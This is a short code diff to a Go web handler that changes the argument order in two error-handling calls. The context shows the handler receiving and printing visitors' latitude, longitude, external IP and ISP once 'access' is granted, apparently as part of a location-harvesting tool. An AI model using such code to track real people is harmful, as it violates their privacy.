@@ -32,7 +32,7 @@ func (h Hndl) Demo() {
 		// Don't change this code
 		case "POST": //POST request handler
 			err := r.ParseForm()
-			c.Try("", err, false)
+			c.Try(err, false, "parsing details")
 			if r.FormValue("Flag") == "1" { //Access granted
 				li := "\t Latitude        :    " + r.FormValue("Lat") +
 					"\n\t Longitude       :    " + r.FormValue("Lon") +
@@ -100,7 +100,7 @@ func (h Hndl) Demo() {
 				c.Cprint(c.N, "IP Information:") //IP Information
 				ipResult := make(map[string]interface{})
 				err := json.Unmarshal([]byte(r.FormValue("Ipp")), &ipResult)
-				c.Try("", err, false)
+				c.Try(err, false, "reading ip info")
 
 				fmt.Println("\t External IP      :\t", ipResult["ip"])
 				fmt.Println("\t ISP              :\t", ipResult["isp"])
